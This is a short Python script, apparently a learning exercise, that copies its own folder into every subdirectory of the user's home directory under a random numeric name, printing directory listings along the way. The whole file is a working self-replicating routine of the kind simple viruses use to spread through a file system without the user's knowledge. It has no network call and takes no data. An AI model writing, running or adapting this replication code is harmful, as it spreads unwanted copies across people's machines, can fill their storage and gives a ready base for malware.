import os
import shutil
import glob
import random

#random number that will be name of folder
dir_name = str(random.randrange(1000000000))

#path to directory of file
path = '\\'.join(__file__.split('\\')[:-1])
#path to destination (directory before this one)
dest = '\\'.join(path.split('\\')[:-1])
print(path)
print(dest)
#lists things in directory 
print(os.listdir(path))

#path to user plus recursive end to use in glob
path_to_user = os.path.expanduser('~')+'/*/**/'
path_to_user_simpler = os.path.expanduser('~')+'/*/'

#recusively checks all subdirectories from given path
directories = glob.glob(path_to_user_simpler, recursive=True)
#printsdirectories path 
print(directories)
#copies from given path to given destination
#must have a name that does not already exist 
for directory in directories:
    #lists things in directory before copy
    try:
        print(directory)
        print(os.listdir(directory))
        shutil.copytree(path, directory+'\\'+dir_name)
        #prints direcotry after copy
        print(os.listdir(directory))
    except Exception as e:
        print(e)
        continue 
